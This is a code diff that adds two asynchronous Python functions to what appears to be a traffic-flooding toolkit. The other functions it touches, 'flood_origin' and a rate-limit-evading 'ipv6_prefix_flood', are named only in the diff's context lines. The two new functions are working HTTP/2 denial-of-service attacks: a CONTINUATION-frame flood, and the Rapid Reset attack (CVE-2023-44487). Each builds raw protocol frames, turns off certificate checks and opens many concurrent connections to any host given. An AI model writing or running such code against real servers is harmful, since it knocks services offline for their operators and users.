@@ -4,7 +4,9 @@ import asyncio
 import json
 import os
 import random
+import ssl as _ssl
 import statistics
+import struct
 import tempfile
 import time
 
@@ -188,6 +190,79 @@ async def flood_origin(
     return result
 
 
+async def http2_continuation_flood(
+    host: str, port: int = 443, connections: int = 10, duration_seconds: int = 60,
+) -> dict:
+    duration_seconds = min(duration_seconds, 120)
+    connections = min(connections, 50)
+
+    total_frames = 0
+    conn_errors = 0
+    stop_event = asyncio.Event()
+
+    def _frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
+        l = len(payload)
+        return struct.pack(">I", l)[1:4] + bytes([ftype, flags]) + struct.pack(">I", stream_id & 0x7FFFFFFF) + payload
+
+    def _settings_frame() -> bytes:
+        return _frame(0x4, 0, 0, b"")
+
+    def _headers_no_end(stream_id: int) -> bytes:
+        return _frame(0x1, 0x0, stream_id, bytes([0x82]))
+
+    def _continuation_frame(stream_id: int) -> bytes:
+        return _frame(0x9, 0x0, stream_id, bytes([0x00] * 16))
+
+    async def _connection():
+        nonlocal total_frames, conn_errors
+        try:
+            ctx = _ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            ctx.set_alpn_protocols(["h2"])
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port, ssl=ctx), timeout=10
+            )
+            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + _settings_frame())
+            await writer.drain()
+            stream_id = 1
+            local = 0
+            while not stop_event.is_set() and stream_id < 2 ** 30:
+                batch = _headers_no_end(stream_id)
+                for _ in range(500):
+                    if stop_event.is_set():
+                        break
+                    batch += _continuation_frame(stream_id)
+                    local += 1
+                writer.write(batch)
+                await writer.drain()
+                stream_id += 2
+            total_frames += local
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except Exception:
+                pass
+        except Exception:
+            conn_errors += 1
+
+    tasks = [asyncio.create_task(_connection()) for _ in range(connections)]
+    await asyncio.sleep(duration_seconds)
+    stop_event.set()
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    return {
+        "host": host, "port": port,
+        "attack_type": "http2_continuation_flood",
+        "connections": connections,
+        "duration_seconds": duration_seconds,
+        "total_continuation_frames": total_frames,
+        "frames_per_second": round(total_frames / max(duration_seconds, 1)),
+        "connection_errors": conn_errors,
+        "note": "HEADERS without END_HEADERS followed by unbounded CONTINUATION frames — server holds stream open in header-receiving state, cannot close or process until END_HEADERS arrives",
+    }
+
+
 async def ipv6_prefix_flood(
     url: str, ipv6_prefix: str, concurrent: int = 500,
     duration_seconds: int = 60, method: str = "GET", body: str | None = None,
@@ -260,6 +335,80 @@ async def ipv6_prefix_flood(
         "status_distribution": statuses,
         "error_rate_pct": round(errors / max(total, 1) * 100, 2),
         "note": "Each TCP connection uses a unique source IPv6 from the prefix — bypasses per-IP CDN rate limiting at the edge",
+    }
+
+
+async def http2_rapid_reset(
+    host: str, port: int = 443, connections: int = 10, duration_seconds: int = 60,
+) -> dict:
+    duration_seconds = min(duration_seconds, 120)
+    connections = min(connections, 100)
+
+    total_resets = 0
+    conn_errors = 0
+    stop_event = asyncio.Event()
+
+    def _frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
+        l = len(payload)
+        return struct.pack(">I", l)[1:4] + bytes([ftype, flags]) + struct.pack(">I", stream_id & 0x7FFFFFFF) + payload
+
+    def _headers_frame(stream_id: int) -> bytes:
+        hpack = bytes([0x82, 0x84, 0x87, 0x01]) + bytes([len(host)]) + host.encode()
+        return _frame(0x1, 0x4, stream_id, hpack)
+
+    def _rst_frame(stream_id: int) -> bytes:
+        return _frame(0x3, 0, stream_id, struct.pack(">I", 0x8))
+
+    def _settings_frame() -> bytes:
+        return _frame(0x4, 0, 0, b"")
+
+    async def _connection():
+        nonlocal total_resets, conn_errors
+        try:
+            ctx = _ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            ctx.set_alpn_protocols(["h2"])
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port, ssl=ctx), timeout=10
+            )
+            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" + _settings_frame())
+            await writer.drain()
+            stream_id = 1
+            local = 0
+            while not stop_event.is_set() and stream_id < 2 ** 30:
+                batch = b""
+                for _ in range(100):
+                    if stop_event.is_set():
+                        break
+                    batch += _headers_frame(stream_id) + _rst_frame(stream_id)
+                    stream_id += 2
+                    local += 1
+                writer.write(batch)
+                await writer.drain()
+            total_resets += local
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except Exception:
+                pass
+        except Exception:
+            conn_errors += 1
+
+    tasks = [asyncio.create_task(_connection()) for _ in range(connections)]
+    await asyncio.sleep(duration_seconds)
+    stop_event.set()
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    return {
+        "host": host, "port": port,
+        "attack_type": "http2_rapid_reset",
+        "connections": connections,
+        "duration_seconds": duration_seconds,
+        "total_rst_streams": total_resets,
+        "rst_per_second": round(total_resets / max(duration_seconds, 1)),
+        "connection_errors": conn_errors,
+        "note": "CVE-2023-44487 — HEADERS+RST_STREAM loop forces server to allocate/free stream state continuously",
     }
 
 
